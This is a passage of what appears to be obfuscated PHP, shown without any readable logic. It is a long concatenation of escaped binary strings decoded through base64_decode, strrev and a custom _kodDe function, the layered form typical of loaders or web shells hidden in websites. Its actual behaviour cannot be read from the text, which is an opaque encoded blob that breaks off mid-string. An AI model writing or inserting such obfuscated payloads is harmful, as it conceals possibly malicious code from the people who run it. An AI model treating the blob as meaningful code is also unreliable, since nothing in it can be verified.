\xf\x74\xf1\xfb\xf0\x81\xc7\x27\xef\x22\x81\x62\x91\xa1\x3e\x1d\x26\xbe\xee\x47\x89\x72\x12\x26\xce\x71\xb6\x6e\x2b\xed\xb5\xb4\xf1"."\340\240\320\242\244\115\341\17\373\50\341\300\167\312\121\246\316\41\207\313\213\312\342\326\312\15\305\205\232\205\63\126\271\170\40\233\155\325\130\137\335\361\11\253\120\202\41\127\222\123\46\254\326\106\316"."\xde\xec\xea\xb9\x52\x1a\x3f\x75\x4d\x7c\x92\x70\xeb\x36\x38\x89\xfc\xc4\xfc\xd6\x4\xe4\x51\x4c\x63\xe5\x38\x62\x1d\x5a\x32\x46\x5e\x67\xf2\xa9\xb4\x51\xb4\x2a\x51\xbb\xff\xcf\x8c\x7d\x39\xe4\xf1\xa\x99\x8\x5d\x70\x9e".base64_decode('JJjH2tyDunzE4XJpQao4z1HGKQG3IkVU28HwxUj70nJyYAhavhQeeLMLRX3WBDjrLse1iAhNHA==')."\346\173\264\134\11\147\341\271\224\33\25\14\346\227\224\347\215\13\146\123\56\207\160\27\147\114\324\127\226\315\133\271\342\251\213\237\272\341\247\64\374\362\337\77\332\367\333\277\320\160\137\46\245\255\142".base64_decode('131wm7cG6/YfTMNCs3/9sm7zuMePPviC64/4/OhI9hsX/OczN7af2nfg/jcPf6v2tPu9U14svg==')."\xfe\x68\x61\xe8\xb2\x9e\x55\x83\xfd\xf7\xce\x9d\xf6\xa3\x9f\xa9\x17\xde\x7d\xfe\x7\x17\x55\x5\x7b\xaf\xf5\x9d\x7e\x57\xdb\x37\xee\x5a\x78\xdc\xdc\x85\x1b\xf\xea\xf8\xc3\xf\xe3\xbd\xef\xfb\x1b\x77\x59\x2f\xf6\xc6\x4e".base64_decode('Pezhudb4k1dYv1+zpyG84NMv7ny36dOHj/zb/gubZr933aJnDsysOOZXWx/+5Lnf7n20T7vhog==').base64_decode('/qP+Orvp1XTy6/9smV5/2eK3/h258LrN723bdN7A4ef+Qb/kkVXGiiN/ud+adb0nRg6Z89bM3g==')."\x8c\x76\xc0\xd\xb5\x1f\x8d\x5d\x76\xc6\x8e\xd5\xcb\xba\xfe\xf5\x86\xb6\xfd\xe1\x43\x8e\x8\x77\x9f\x7b\xe7\x5d\xd3\x8b\xc7\x17\x7e\x7d\x49\xf8\x67\x87\xc4\xf6\xdc\xf4\xdc\xef\xa2\xc7\xdf\x72\xc2\xed\x93\x1a\x3e\xfd\xde"."\135\323\262\327\376\343\305\235\211\315\7\157\32\334\270\151\350\252\267\177\34\213\157\272\144\315\21\367\355\233\376\235\310\263\57\234\170\362\335\17\234\323\65\236\255\373\375\21\277\352\276\152\305\317\217"."\175\175\321\266\177\265\275\67\363\260\321\343\117\272\146\164\305\145\57\77\167\301\275\341\233\217\374\170\345\225\153\257\274\171\321\312\223\57\230\267\373\330\237\176\255\345\354\27\67\225\174\73\237\11\254"."\x38\xbc\x77\xfc\xa3\x19\xcf\xb5\xd\x6f\xd9\xd8\xf6\xd3\x3d\xd6\x45\xbf\x33\x6f\xdb\x33\xf3\xf6\xad\xd\x1f\x1f\x72\xd7\x4b\xd7\x3d\x78\xe1\x6b\xeb\x2f\xfd\x8f\x3b\x56\xac\x39\xe3\xac\x9f\x3c\x36\x3e\xeb\x9c\xd1\x91\x83".base64_decode('dqz67ptXBz/oueH1Zz79wyFLjx3+y1G7Rp9edPWj6+5+um3DvtEbHz7iqgPO+V7dOR2eb1W1/w==')."\xe3\x91\xfa\x87\x23\xdf\xbb\xea\x30\x6f\xbd\xf7\x1b\x5b\x7e\x69\xfc\x78\xd9\x79\x4f\xf5\xce\xbe\x31\xd2\x97\xcc\xec\xff\x9d\xf\xf7\x1c\xfe\x3f\x7\xee\xbd\xcc\xf8\x78\x51\xe7\xb2\x53\x6e\xfc\xed\xaa\xd1\x63\x2f\xf9\xed"."\212\327\232\137\30\274\266\360\370\41\367\334\261\345\210\25\223\116\234\367\366\263\73\136\170\154\376\261\33\122\332\314\357\76\337\321\173\114\167\156\166\323\215\113\173\176\323\176\314\345\217\206\246\74\176"."\xfe\x5f\xbf\x7f\x67\xef\xd7\xf\xfa\xd3\x1d\x3\xfb\xdf\x7e\xff\xe6\x9f\xce\xfa\xf5\xc2\x5\xf5\x3f\x6e\x68\xb8\xee\x81\x70\xfe\xca\xcb\x6a\x6f\xf1\x1d\xbb\xe4\x93\xff\x6e\x58\xff\xbe\xef\x3b\xc9\x5d\x2f\xce\xfc\xf8\xda".base64_decode('Wf/T+efPZt97oVJY3/33S68/clbH6qtv/N7e9dv2rPtw28bJHT87qfb7m6+4aNfKOakfXLLtFQ==')."\x65\xce\x2b\x77\x75\x3e\x7f\xd3\x9\xc7\x16\x6e\xd9\x32\xed\xe6\xaf\x1f\x7c\xc0\x59\x27\xae\x7e\xb9\xfa\xc4\x9d\x7\xe4\x3e\x3f\xb8\x61\xc7\xb3\xf3\x16\xff\x75\xfe\x99\xc1\x73\x8e\x6f\xbb\xe1\x98\xd\xc7\xec\xf9\xfa\xb7"."\x5f\x3d\xfe\xa3\xde\xc3\xa6\x76\x5a\x27\x2e\xbf\xb9\xe6\xa2\x83\xf6\x5b\x76\x46\xe6\xd4\x47\x1a\xae\xbb\xe9\xc4\xf5\x57\x4e\xd9\xbe\xe6\xac\x63\x57\x9d\x3b\xfb\x9b\x37\x8f\x5d\x7c\xfe\x3f\xbe\xd6\xf9\x6a\xeb\xd2\xef\x5d"."\xfb\xf0\xb\x8f\xfa\x8f\xbc\xea\xef\xdf\xbc\xfe\x90\xa7\xf\xad\x5b\x71\xcf\xb2\x1d\x27\x2d\x5d\xf9\xc2\xac\x27\x4f\x5c\xfa\xcd\x6f\xf7\xbd\xd4\xb2\xbe\x7f\xd2\x81\x9f\xd4\x5c\xd7\x70\xdc\x7\xe7\x6c\x7b\xe1\xb5\xf3\x3f".base64_decode('0zd86w+PJ/e/77zU4tOPfXzexq8NjG07fNuvdxyz8Z+Pzjnknbun/3rW/SPvnHbS8/c8c8DGCw==')."\x67\x3d\xb6\xe6\xc8\xdd\x1f\xdd\x73\xa5\xf6\xcc\xe6\x6f\xfd\xfa\x9c\xe3\xff\xe3\xb8\x7b\x7f\xf9\xf0\xc0\xef\x22\x21\xe3\xd2\xe7\x23\xb7\xaa\x7b\xae\xbf\xf6\xcd\xd3\xb6\x24\xde\xbe\xf3\x91\x79\xeb\x4e\xaf\xd\x6c\x3f\xd0"."\274\253\365\274\63\133\17\353\73\373\342\335\7\336\347\273\363\233\143\163\247\317\174\341\24\75\322\177\320\326\316\13\116\235\275\155\361\326\263\333\26\173\147\136\365\166\162\307\37\323\167\275\376\306\346".base64_decode('lwZ2frrxa4fvv3p48R9fX/6XY6bqJz147Bvrap+/5piC0b5wSe6KC9bee2TmpccnHTN5R/83Dw==')."\235\36\236\274\156\305\237\357\70\354\367\357\307\363\363\36\272\55\161\365\142\343\167\323\216\373\353\25\147\336\253\153\163\157\323\372\43\253\267\176\53\164\322\177\147\126\137\367\310\55\307\317\372\125\167"."\xd5\xd2\xb\xce\x54\x5f\xba\x65\xf1\x3b\x37\x4d\xf9\xcf\xc5\x7\x65\x76\xe6\xec\xbf\x1f\x75\xdf\xdc\xf\xba\x97\x2c\x7a\x61\x5d\xe0\xd6\xfb\xf5\x17\xd7\x1d\xf4\xd6\x6f\x46\xf6\x4b\xbd\x3b\x77\xd9\xf5\xff\xbd\xf3\xae\xec".base64_decode('Dz+OjQ3eue6qG47ddErjkyPvfVK4zl4+O3t+w3W/+9O6V0vnXLRi3+F271sP/mb9pzf7ntnwnQ==')."\27\233\253\73\6\253\216\271\264\143\373\23\133\117\72\171\353\123\37\277\174\364\207\267\274\24\117\235\260\247\371\300\373\136\273\177\364\241\127\117\133\375\374\351\73\226\276\275\352\260\266\377\272\73\270"."\71\173\327\245\363\17\373\356\216\36\377\216\323\237\117\177\57\226\375\305\373\217\64\247\122\47\375\142\177\173\277\307\72\253\336\371\376\212\171\367\137\325\375\77\107\176\164\157\355\100\364\335\167\337\274"."\366\372\153\66\77\366\267\276\371\133\206\257\350\75\377\271\127\307\337\337\166\305\57\236\350\235\364\373\27\323\207\165\116\237\235\171\364\70\353\301\243\137\352\75\363\355\155\207\177\337\363\355\33\177\162"."\xc3\xd7\xc7\xde\x7f\xec\x81\x4f\xb3\x5f\xfc\xfd\xf6\x9b\xf7\xfc\xe9\x83\xf5\xcf\x6f\xdd\xb1\x7a\xda\xc7\xd7\x5f\xbd\xff\x2b\x87\x6e\x3d\x71\xf5\xd1\xf3\xef\xfb\x6c\x6c\xe3\x13\xb\x3e\x7b\xeb\x5f\x4f\xa9\xb7\xbf\x3a\xff"."\241\177\75\373\201\251\76\170\337\17\76\375\350\363\67\167\252\275\367\177\361\351\243\213\266\373\26\374\373\203\347\337\74\145\351\103\237\376\363\200\23\36\172\250\72\374\367\163\27\134\370\151\144\123\176"."\246\166\306\1\271\357\35\147\34\367\355\13\336\133\65\163\277\140\103\113\46\160\315\324\13\256\330\373\37\147\377\352\261\353\136\277\276\273\167\366\302\205\307\175\375\216\356\111\353\23\125\257\172\257\216"."\164\337\363\255\301\247\254\155\231\327\156\72\170\143\173\144\335\217\254\353\146\137\74\362\327\277\167\136\172\370\25\357\114\136\167\374\33\217\355\16\275\361\300\326\35\77\35\370\170\351\363\175\33\176\372"."\xe7\x9e\x1f\x7c\xbe\xef\xbf\x5f\x7a\xe3\x8b\x33\x3a\x6e\x3d\xea\xb0\xcf\x67\x2c\x3f\x3d\xf1\xf4\xfb\xcf\x5d\x7c\x48\x68\xc3\x45\xff\xe8\x9b\x72\xe1\x1\x3f\x59\x71\xe1\xfd\xc5\xcc\xd4\x93\xce\xfb\xf4\xbc\x63\xfe\xfd\x87"."\231\337\373\353\255\107\355\254\332\372\355\243\317\273\373\245\175\373\227\156\170\372\315\43\227\36\165\326\265\323\256\233\173\303\272\33\17\16\54\173\303\176\356\354\157\337\26\170\357\163\155\365\217\156\176"."\376\255\361\237\77\336\372\336\367\277\276\153\262\61\355\302\73\376\353\221\145\177\370\317\77\114\236\74\166\116\355\371\163\117\374\242\247\356\201\15\107\237\377\104\172\357\103\377\266\12\117\34\61\331\232"."\xfe\xc9\x83\x9f\xa5\xdb\xae\x5a\xfa\x8b\xdf\xfd\xf1\xd6\xb9\x4f\xa4\x2f\xbd\x79\xc1\xb6\x95\xef\xdc\x10\xfb\xf0\xc6\x59\x2f\x4c\xbb\xf9\xaf\x6f\x7d\xb6\xec\xbd\x5d\x63\xef\x78\x76\x3e\xfb\x97\xb9\xaf\x3e\xd9\x7d\xf6\xef"."\226\74\364\242\157\150\340\273\73\67\34\76\175\367\47\247\315\322\73\156\276\63\144\356\174\151\351\217\127\336\266\156\305\312\137\135\374\313\217\337\130\377\312\117\2\243\275\203\277\377\323\53\73\236\337"."\332\167\323\143\33\27\234\370\347\77\316\270\155\113\353\263\315\123\132\217\376\321\374\113\136\74\347\356\350\71\37\135\174\353\265\177\373\344\275\357\137\31\337\73\166\326\265\77\130\60\373\153\375\377\365".base64_decode('bM+zJ17/o5dPv+OOfx2//ZqeP3/61m9mTjq+4eGNb583eMCvj2vZst/OntfqfvLMzk2r9+s5fg==')."\313\315\167\276\171\340\37\265\357\376\343\225\205\273\216\76\346\232\375\217\277\370\300\5\177\371\142\147\335\305\223\236\177\177\303\256\304\163\107\35\162\360\23\213\237\374\315\177\65\155\136\171\374\63\147"."\xc5\x2f\x8\x8e\x1f\x75\xe5\xf4\x67\x7d\xff\xac\x9a\xb4\xf7\xae\xa3\x37\xa5\xf\x7a\xb9\xe5\xfb\x77\x5\x37\xff\xe6\xca\xe6\x6b\xe6\x5d\xb9\xf7\xd6\x27\xf\x1d\xff\xda\xd3\x57\xbd\x7c\xfa\x5d\x8b\xbf\x71\x42\xff\xc3\x3f"."\277\340\232\277\15\347\176\163\321\324\327\13\177\276\373\142\303\177\320\17\76\333\171\311\144\357\213\257\234\263\352\147\211\227\253\126\307\67\154\370\316\143\235\311\314\23\327\34\173\331\11\37\24\116\376"."\x4f\xdf\x6c\xeb\x48\x7d\xf7\xe7\x46\x63\xfb\xba\xc6\xd6\xce\xcf\x36\xfc\xfa\xfa\x83\x5e\xd8\xef\xa9\xa6\x67\x17\x3f\x7b\xca\x1d\xdf\xdf\x72\xe9\x1d\xf\x3f\x9b\xba\xea\xbb\x6f\x3c\x56\x7a\xaf\xed\xbe\xbb\xcf\xf0\xa4\xa6"._kodDe('KBHV4DRzX/JXO7bLXS2yUd1MnfKzpc6i5GCzULzpocKMqWcu9Otzc5y1pdro2747PTLN7GrDjHk=')."\33\266\114\217\354\277\373\311\247\156\170\340\201\130\377\272\233\203\277\130\362\362\216\363\157\330\74\176\360\155\33\57\171\347\346\57\176\373\227\231\351\75\363\46\377\372\223\337\216\275\371\351\326\323\127"."\xd\x94\xde\xde\x17\x3f\xe3\xd0\x63\x9a\x7f\xf3\xc1\x45\xf7\x1f\xf8\xec\xb6\x9f\x1f\x7e\xce\x3b\xdf\x3e\xf1\x4f\x97\x5f\xd6\x3a\xba\xe2\xd5\xbb\xeb\x2e\x5a\x3b\xf7\xad\xf8\x6f\x27\x57\x4d\x9e\x36\xde\xf4\xcb\x27\xf7\x9c"."\x5a\xf5\x8b\xfb\xfa\x8e\x79\xf7\xaa\x5d\xf7\xf\xec\x1b\x4f\x9d\xfa\xda\x41\x5f\xc4\x7b\x2e\x5f\xb0\xf3\x7f\xc6\x46\x8e\xfb\x6c\x57\xed\xd0\x21\xcb\xbb\x63\x47\x3f\xfc\xc4\xf\x1b\x4e\xbf\x7c\x24\x72\x6d\xdd\x5b\x8f\x7c"."\147\137\354\271\33\176\176\371\17\167\255\171\357\371\61\363\301\173\276\170\377\230\143\116\370\341\332\367\256\121\325\65\357\357\173\276\332\357\373\341\277\267\230\352\332\301\367\136\173\342\332\177\250\13\176"."\70\362\341\323\346\272\207\314\57\206\77\34\377\360\371\376\23\172\77\173\143\347\61\327\374\140\315\207\37\252\333\377\375\341\77\177\370\357\317\277\66\160\360\360\21\177\337\77\267\156\364\310\275\326\113"."\123\106\47\337\262\143\350\356\167\357\177\342\117\177\371\374\314\117\327\374\264\347\326\77\15\276\271\351\201\317\307\3\77\177\145\337\107\227\176\361\267\77\276\167\303\343\325\53\256\335\367\207\143\67\77"."\371\154\375\257\262\157\205\173\266\174\322\377\354\213\237\315\273\244\367\351\261\157\34\167\125\367\243\317\175\264\345\236\233\76\273\175\370\372\364\65\365\347\34\376\370\235\237\50\27\76\376\263\300\331\301"."\35\251\65\253\72\16\276\371\274\115\7\76\365\343\215\363\46\275\175\313\237\336\254\73\366\337\107\74\63\276\351\223\145\107\63\133\306\206\231\247\320\300\140\172\125\166\324\142\2\52\55\233\32\54\201"."\x80\x6f\x16\x8\xb2\x4b\xa3\x79\x3b\xc7\xf4\x19\x20\x6d\x24\x3b\x9c\xd6\x6c\x10\xe6\xa5\xd2\xa5\x62\x7f\x96\x1b\x23\x96\x52\xf9\x1\xe0\x69\x67\xd6\x81\xb6\xd3\x8c\x7a\xe0\xd8\xb2\x56\x72\xc0\x30\x81\x4d\x2c\xe\xe\xd9".strrev('GæW†Ù’µ>VJ¹~3È›0f\\9[Q\\±#Ô{:­ ™ôÎI¯Ê™%Âf œ&£')."\127\101\211\372\6\150\253\257\270\162\324\142\135\265\373\222\103\146\1\164\305\7\126\46\7\55\3\224\5\116\1\275\72\263\257\144\214\146\230\360\24\205\127\145\1\0\365\63\341\376\177\166\75\300\147"."\x70\xb8\x94\x35\xb\xec\x22\xc6\x4c\x8e\x70\xbd\x23\xa3\x38\x98\xb2\x4d\xf8\xce\x8c\x59\x50\xf1\x94\x39\xb3\x58\xa\xf4\x7f\x3a\xfc\xce\x60\xbd\x1d\x34\xb0\x10\x19\x8e\x5a\x73\xea\x0\x5c\xc3\xa3\x69\x2d\x3f\x8\xc7\xf5"."\x81\xd1\x74\x2a\x67\x31\x45\x80\xe2\xd0\x40\x9e\x29\xf0\xc\x8e\xe6\x56\x16\x87\x4a\x70\xee\x18\x4a\x6b\x3\x19\x38\xab\xd8\xd9\x42\x69\x78\x28\xcd\xc0\x3c\x7\x40\x9a\x1b\xd6\x8d\x24\x8c\xb5\xe1\x14\x18\xd5\x8c\xd9\xd0".base64_decode('qYZ6+Lw1sErL90FTs2bAbM+ph2nLr0SsfQG4/ukNrDKg3iw2+lkN0Fx6oD9pDEL5WUyhsWHOdA==')."\206\165\253\6\222\151\300\215\231\63\240\257\53\315\301\376\354\10\364\325\36\116\217\256\144\227\23\365\165\14\175\146\100\123\205\201\76\303\112\303\7\146\314\250\147\47\337\376\321\324\252\64\353\103\52"."\323\77\4\312\10\3\366\120\237\236\141\330\314\240\63\235\215\40\75\334\237\34\54\1\300\347\234\2\243\230\65\233\351\332\32\132\51\235\315\260\211\144\110\62\33\300\64\224\36\64\65\146\230\63\332"."\x37\x38\x50\x5c\x99\x65\x1d\x9f\xce\x60\x0\x95\xa\xb9\x7c\xba\x64\xc3\x11\x69\x26\x3\xc8\x4c\x6\xb8\xfa\x59\x75\xc\x31\x60\xa4\xab\x46\xfa\xd3\x43\x9a\xc1\x90\x9\xca\x8d\xda\xe9\x94\x36\x8\x78\x30\x8b\xcd\xe2\x2c"."\x8e\x63\xe6\xc8\xaa\x5c\x61\x94\x7d\x5\xbe\xcd\x75\x87\xe7\xb0\x9\x4e\x17\x6\x34\xbd\x8\xb7\xef\xfa\xca\xfe\x9c\x66\xb0\xc5\x35\xa3\x8e\xad\x78\xe8\x8\xc3\x99\x92\x96\xb3\xf3\xc3\xc\xf1\xd9\xe4\x9d\xc2\x70\x4b\xd3"."\xcd\x42\x71\x0\x60\x75\xca\x74\x0\x70\x21\x95\xed\x37\xd3\xf0\xa1\xc1\x6c\xd1\x1c\x62\x4a\x4b\xb3\x67\x42\x45\x23\xbf\x6a\x68\x80\x99\x27\xcd\x9c\x1\x5f\x9b\xd3\x0\x2d\xf4\x99\xa3\xb9\x21\xa6\xfd\x67\xe6\xc\x2d\x33"."\2\144\243\77\145\344\13\131\150\333\130\71\224\35\354\203\126\206\163\5\163\240\177\45\240\370\340\200\236\352\207\176\327\317\141\375\237\311\60\13\300\135\32\116\347\255\2\103\130\300\114\253\77\125\32"."\x5\x7c\x9d\xc3\x68\x59\xbf\x96\x36\xed\x3c\x10\x97\x39\xd3\xa1\x6c\xff\x4a\xc3\x2a\x32\xba\x87\xc8\x45\xaa\x30\xcc\xc8\x5b\x6a\x25\x5a\x8a\x4c\x28\x93\xce\xe\x8c\x18\x83\x8c\x32\xb1\x59\x67\x98\x79\xa\x9b\xb3\x66\x2d"."\x39\xc0\x64\xd9\x5c\x2d\x5c\xd6\xb6\x2e\xea\x56\x29\x6b\x53\xc9\x9f\x7c\xbf\xc4\xcc\x69\x8d\xbc\x2f\xa7\xe5\xb9\xc2\x53\x3b\x60\x92\x9c\x46\x9b\x80\x85\xa2\xeb\xcc\x10\x2\x20\x6a\xb\x35\x1a\x50\xfa\x86\x74\x23\xa7\xb".base64_decode('WT29gGE1hQQBi28kRRwcjcutJPO2lI1ijty4bFECI8U99MkQWA5d8NbXKzkzb2cgnWF7hRtfEA==')."\x3d\xcb\xd7\x79\x3\x66\x2a\x99\x35\x4b\x29\xc7\xb7\x52\x7d\xbe\xa\xb0\xa6\xe3\xab\x94\x93\x76\xa7\x73\x75\xae\x3e\x69\x1e\x45\xe3\xe\xd3\x4\x96\xe6\x80\x2b\xad\x7\x97\x49\x8b\x74\x5b\x49\xf5\x51\xab\x7a\x8b\x29\x80"."\321\54\225\374\201\341\121\13\163\13\333\15\160\353\111\166\157\350\64\261\241\315\373\330\134\323\233\13\133\263\6\174\162\207\275\162\256\221\107\3\314\146\175\116\357\3\330\15\100\127\247\232\10\304\27"."\113\112\234\330\114\335\361\371\262\301\212\271\227\100\56\243\200\23\60\14\305\366\156\337\65\266\345\262\361\255\167\214\157\272\175\354\276\113\366\336\176\307\330\3\133\121\164\367\75\233\307\156\377\311\276".strrev('—]î÷[Ï«ñ¶ç¾î6[ît>ö®÷w<nÆ[êì`~Ï{í–ØáŞï]î{ÜÎ{îÓg¾ïÖ+').base64_decode('jZ137di5W8Yv2bT7gatR+fHzRMuo2Nht23Dd+9eN3XPP3utu4bnv3n8WEOOMmJ74aWE2MQSvlQ==')."\371\12\140\264\156\371\224\316\254\216\40\246\20\243\44\254\306\147\147\364\242\142\23\165\76\15\375\313\233\171\57\305\115\66\307\106\36\147\53\14\326\76\216\277\11\75\127\300\130\10\120\362\123\173\153"."\141\5\323\102\44\246\112\237\66\240\320\173\11\332\53\37\273\261\36\341\63\303\172\115\276\110\254\175\1\265\340\143\70\217\246\162\177\31\36\66\2\174\313\240\24\364\142\316\260\260\22\270\142\246\261".base64_decode('GZqC70QYYjrXTKX5phkVsB5PukCaGhysdfZJwUJWJa2hYKpRSaP67HapV7FNFnYt24rYxTvBMA==').base64_decode('rJ9fcAi5O3RLsrKil1tlmE3ogJO0OSiEkyjKWU44gGCcKJd4FNoVDwGvR3G6LcDKIkwBA49FTA==')._kodDe('LUCH6pKqkZw1hyifAAiZ7aOghx22QX30+bwjZqEj/vJPbZF/iTU9Oyl2ZyNzVs2tgqdSAlUHgmg=')."\xd1\x44\xf1\x43\x74\x99\x46\xc5\x55\x80\x6e\x9\x53\x84\xa2\x9e\x32\x98\xd6\xbb\x9e\x23\x25\x81\xb6\xfb\xa4\x8b\xb8\xb9\x58\xd8\xcf\x2c\x33\x8d\x2\x84\x8a\xa5\x3c\xee\x12\x90\x53\x6a\x7e\xc7\xd5\xf3\x93\x68\xd\x17\x1d"."\xf7\x90\xf3\x16\x14\x32\x5\xc\x6c\x7b\xee\x2\x30\x78\x61\x86\xa4\x52\x3f\x21\x2c\x2c\xd\xe5\xd4\xac\xfb\x6e\x93\xaf\xf8\xd6\x66\xc9\x9f\xb\x2e\xd6\xe8\xf5\x7a\x25\x19\xbc\xd0\x59\xc4\x21\x95\xd\x9e\x98\x8c\xc5\x33".strrev('z3@à‚‚ôÌ„WÛ0Æ‚šet5íGïë	z5ÊŞ”NäñŠ€8¡6Cf²‹ò‡4Õˆ')."\140\22\20\164\1\244\123\174\63\200\365\262\346\62\365\124\202\132\115\322\310\304\234\100\152\51\237\145\251\50\210\212\304\350\314\64\72\301\241\347\123\122\245\271\132\322\226\132\125\323\0\157\237\0\225"."\66\115\344\353\51\260\243\365\113\0\34\202\2\254\156\207\23\205\320\370\275\34\253\320\314\243\35\65\105\351\43\354\216\320\244\45\271\340\210\11\204\304\325\11\270\276\244\252\55\143\103\1\355\332\171".strrev('<jC::œÍ©—Æ(kjÍC‡'."\n".')«Z±Û,EA~ØãKfn=	d³QÎ¼¦ûal}v5emƒ®')."\225\254\160\301\226\153\161\264\125\155\211\106\27\207\0\65\33\245\55\5\33\31\13\225\2\34\23\306\306\170\301\311\232\214\62\17\206\75\324\140\346\41\256\200\306\57\102\376\226\366\100\214\133\171\314"."\xf4\xd5\xf9\xea\x45\x59\xf4\x41\x15\x9b\xb4\x34\x31\xff\x18\xf1\x44\x20\x56\xc1\x4f\x11\xf5\x5f\x4\xd3\x0\x3e\x8b\xa0\x42\x7b\x74\xa9\xd2\x12\xd\x77\x75\x44\xe2\xd4\x3d\xf\x4d\x8f\x44\xa5\x7c\xa2\xcb\xf\xd9\xcc\x8b".base64_decode('UXk2NB/sDAdagkookogybW2u0EyssuI8zkBQtIR+ONSnEdlyTG6RtwSdEdej0C+lCUrAp5RoRA==')."\151\355\352\14\207\132\2\211\240\262\70\270\134\241\306\147\320\200\277\333\123\335\123\325\63\265\247\246\247\166\205\257\307\352\365\113\134\202\41\317\57\104\72\133\1\76\215\74\224\262\140\315\167\304\321".base64_decode('7kyD0VigJczG0hyIQzDaEqKBPZf+cvd9m/dcdfvY+ZtQQ+NXrhu//G7EuWFu7fYL9zy4efzS7Q==')."\xe3\x17\x2\x97\xa5\xec\xdd\xbe\x73\xf7\x3\xf\xed\xb9\xf4\x96\xb1\xdb\xb7\x8d\x5f\x76\xef\x9e\x2b\xcf\xa1\x19\xfb\x6e\xfd\xe5\xd8\x5\xb7\xf0\x8e\x29\xfb\x2e\x79\x70\x7c\xf3\x4d\x9c\x83\xa3\x8c\x9b\x7\xd5\xde\xb7\x7e"."\323\236\7\156\307\374\333\15\147\216\357\330\70\176\365\246\261\13\256\33\273\342\226\75\233\267\217\135\177\366\330\206\115\173\267\157\75\321\215\211\64\336\315\346\22\374\46\370\317\300\76\57\350\374\364".base64_decode('WNPw3NSi3xpsPIR+mQ0E0Uw/rSsYaQm6be/kKPiImkpRjGpMAfNugY8pFifOZ5qqJ+zFGkAgqQ==').base64_decode('U1JnWoPxllioOQjmKXyiphDmbwr05rRwPLaEh7mNdplPL6WGrYZaxTEQzZc0s6VcnnRWqcIagg==')."\125\36\274\243\21\103\100\245\12\357\340\50\101\307\236\62\152\260\153\40\242\140\136\275\274\332\123\347\251\257\125\300\341\27\255\1\156\276\224\52\260\123\340\365\34\37\361\364\71\142\365\236\272\132\245"."\252\60\120\5\375\22\160\105\275\127\151\111\113\321\74\65\320\141\271\273\242\54\42\272\226\135\324\14\164\132\122\222\36\236\304\353\243\137\207\353\256\244\117\324\240\363\204\112\270\323\224\100\244\325\131".strrev('L• ¢lY¥»Ißjz-Móâ.tĞ€Ó5“F'."\0".'æ©&B§èÀúU®®i±}ÍŸI¾Ú&¬êüz’')."\116\245\263\305\312\232\150\30\150\162\150\171\24\340\71\330\342\205\267\204\350\31\317\140\63\210\323\371\44\126\310\43\256\330\252\50\247\111\307\231\263\372\31\255\4\7\30\35\313\371\30\30\56\163\165"."\64\356\310\15\133\252\6\23\55\355\24\313\343\22\232\247\372\246\70\20\125\200\123\161\240\10\77\127\101\71\272\134\60\101\230\104\312\205\42\330\214\231\32\146\306\133\332\203\35\1\37\354\2\24\23".base64_decode('aHnMtyFKXI0pH02qdoCffIiBLEG+itaVaiNOi0Kh0A+dgdlXiCcPjVRpqqa+l6BJ7nEwGkuoCA==')."\0\100\236\45\252\133\55\155\67\222\61\2\266\74\34\144\314\141\32\261\116\46\363\42\225\352\143\216\11\121\343\270\315\226\150\244\55\304\154\120\133\101\144\120\110\231\216\102\255\261\20\166\255\3\337"."\127\130\123\222\11\60\212\10\25\33\24\51\14\245\170\130\270\47\301\31\234\151\100\21\301\63\240\10\337\154\160\51\311\203\42\376\176\74\302\303\202\161\106\221\256\70\263\13\302\324\167\151\53\17\267"."\163\223\175\234\21\215\111\221\100\54\320\21\347\321\330\122\156\147\304\323\250\275\221\32\351\352\20\24\77\34\130\202\220\45\52\70\34\106\255\153\174\123\27\324\366\120\3\122\32\244\77\13\131\14\33"."\325\365\256\256\367\50\263\326\326\102\31\356\223\306\316\30\171\306\236\342\257\234\26\126\303\321\105\64\116\74\73\6\363\51\161\26\122\272\25\304\53\47\4\257\154\261\255\213\257\6\5\341\60\343\3"."\x22\xd1\xa5\x1\xe1\x2c\x50\xca\x80\x14\xe1\x3b\xd0\x7f\x46\x77\xcf\x50\x8f\xf\x31\xb\xd6\xa\x61\x10\xda\xda\xac\x30\x3e\x86\x78\x27\x82\x63\x23\xd4\xe\x70\x4e\xc5\x3\x3b\x86\x9a\x35\xfb\x39\x8b\x19\x69\x65\xec\x2"."\375\135\306\2\204\126\102\205\44\161\60\60\314\73\21\360\236\256\366\254\351\71\271\307\353\243\126\270\230\171\351\361\210\56\251\301\145\150\217\215\307\35\46\304\152\16\373\47\140\114\121\214\15\217\256"."\132\32\231\7\77\160\222\233\7\107\11\210\316\157\342\223\31\74\155\115\4\375\133\224\130\23\104\377\302\350\47\234\100\323\145\360\2\150\111\206\103\213\203\153\360\177\42\243\226\3\222\232\273\71\53"."\204\42\153\320\377\210\300\254\11\105\334\215\65\7\23\113\203\101\132\200\205\341\127\24\105\4\7\206\52\171\376\304\226\50\220\55\54\123\240\151\125\255\41\300\364\366\116\253\125\125\277\325\5\370\302"."\175\326\324\124\117\256\257\206\75\44\20\157\21\324\327\201\20\345\270\100\354\106\234\210\300\375\131\102\174\121\54\332\325\51\305\333\3\113\102\221\105\54\346\147\366\25\312\124\150\132\151\15\305\21\210"."\x5a\x18\x32\xa\x37\x9b\x72\x1c\x18\x4e\xc2\x16\xc9\x6c\xb3\x3\xa5\x5b\x11\x65\x47\x11\x89\xe7\xc7\xa7\x9\x4a\x99\x9d\xab\xac\xb9\x2b\x14\x6e\x95\x9d\x24\xe0\x82\xb0\xa1\x10\xaa\xe\x7b\xca\x14\xd6\x39\x16\x27\xee\x12"."\130\4\203\234\205\11\272\261\10\201\1\213\120\0\260\30\1\27\213\20\167\236\54\102\6\312\42\370\170\23\214\260\74\164\254\104\107\102\166\126\314\150\203\334\354\167\156\252\117\162\150\343\222\346\22"."\11\230\44\17\240\147\12\105\362\43\200\305\302\222\324\312\117\113\40\6\223\224\101\277\75\53\26\20\6\170\5\303\105\152\325\156\47\14\233\373\42\240\36\244\250\375\51\372\150\210\230\34\113\237\145"."\346\72\104\12\252\232\222\320\236\354\315\162\202\20\170\121\11\77\210\254\205\264\10\153\236\22\141\66\215\72\217\135\234\24\255\340\247\51\60\227\365\300\57\333\241\212\146\1\204\243\106\32\374\5\63"."\11\6\375\71\214\376\364\100\5\46\374\350\201\156\124\173\140\353\355\141\154\173\167\317\160\135\235\27\375\67\33\375\153\106\377\132\320\277\40\116\150\353\31\76\245\15\5\346\264\365\372\113\120\253\247"."\152\42\200\103\1\6\166\210\126\321\50\253\145\360\235\62\231\301\176\225\124\73\307\356\23\310\221\116\310\350\351\275\201\210\267\306\242\235\224\157\121\102\155\12\365\66\242\124\323\233\206\152\30\173\113"."\x2c\x88\xd7\x14\x2d\xc5\xf2\x6a\xaa\x1d\x22\xb